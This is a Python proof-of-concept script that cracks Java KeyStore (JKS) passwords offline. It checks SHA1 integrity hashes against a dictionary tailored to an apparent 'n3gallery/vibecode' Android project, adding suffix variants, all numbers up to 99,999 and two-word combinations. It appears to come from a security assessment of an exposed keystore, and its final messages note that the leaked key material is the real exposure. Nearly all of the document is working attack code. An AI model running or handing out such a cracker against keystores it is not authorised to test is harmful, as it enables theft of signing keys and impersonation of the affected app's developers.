#!/usr/bin/env python3
"""PoC: Offline password check against a JKS keystore.

JKS stores integrity as SHA1(password_utf16be || keystore_body).
That allows a fully offline brute-force / dictionary attack with no
keytool and no knowledge of the alias.
"""
import hashlib
import itertools
import struct
import sys


def jks_ok(data: bytes, pw: str) -> bool:
    if len(data) < 24:
        return False
    magic = struct.unpack(">I", data[:4])[0]
    if magic != 0xFEEDFEED:
        return False
    stored = data[-20:]
    body = data[:-20]
    h = hashlib.sha1()
    h.update(pw.encode("utf-16-be"))
    h.update(body)
    return h.digest() == stored


def main() -> int:
    path = sys.argv[1]
    data = open(path, "rb").read()
    magic = struct.unpack(">I", data[:4])[0]
    ver = struct.unpack(">I", data[4:8])[0]
    count = struct.unpack(">I", data[8:12])[0]
    print(f"[*] file        : {path}")
    print(f"[*] size        : {len(data)} bytes")
    print(f"[*] magic       : 0x{magic:08X} ({'JKS' if magic == 0xFEEDFEED else 'PKCS12/other'})")
    print(f"[*] version     : {ver}")
    print(f"[*] entry count : {count}")

    words = [
        "n3gallery", "N3Gallery", "n3Gallery", "N3gallery",
        "n3vibecode", "N3Vibecode", "n3Vibecode", "N3vibecode",
        "vibecode", "Vibecode", "gallery", "Gallery",
        "n3", "N3", "n3photos", "N3Photos", "photos", "Photos",
        "android", "Android", "release", "Release",
        "n3galleryrelease", "n3vibecodegallery", "N3VibecodeGallery",
        "n3-release", "n3release", "keystore", "Keystore",
        "secret", "password", "Password", "123456", "12345678",
        "123456789", "1234567890", "qwerty", "abc123", "admin",
        "test", "default", "changeit", "changeme", "letmein",
        "", "1", "12", "123", "1234", "12345", "0", "000000",
        "n3vibecode2024", "n3vibecode2025", "n3vibecode2026",
        "n3gallery2024", "n3gallery2025", "n3gallery2026",
    ]

    cands = list(words)
    # case / suffix variants
    for w in list(words):
        for suf in ["1", "12", "123", "!", "01", "007", "2024", "2025", "2026"]:
            cands.append(w + suf)
        cands.append(w.upper())
        cands.append(w.capitalize())
    # short numeric
    for n in range(0, 100000):
        cands.append(str(n))

    seen = set()
    tried = 0
    for c in cands:
        if c in seen:
            continue
        seen.add(c)
        tried += 1
        if jks_ok(data, c):
            print(f"\n[!!!] PASSWORD FOUND: {c!r}  (after {tried} tries)")
            return 0

    # 2-word combos from the project vocabulary
    base = ["n3", "N3", "gallery", "Gallery", "vibecode", "Vibecode", "photos", "release"]
    for a, b in itertools.product(base, repeat=2):
        for sep in ["", "-", "_", "."]:
            c = a + sep + b
            if c in seen:
                continue
            seen.add(c)
            tried += 1
            if jks_ok(data, c):
                print(f"\n[!!!] PASSWORD FOUND: {c!r}  (after {tried} tries)")
                return 0

    print(f"\n[-] no match after {tried} candidates.")
    print("    => keystore password is NOT trivially guessable.")
    print("    => the exposure here is the KEY MATERIAL itself, not the password.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
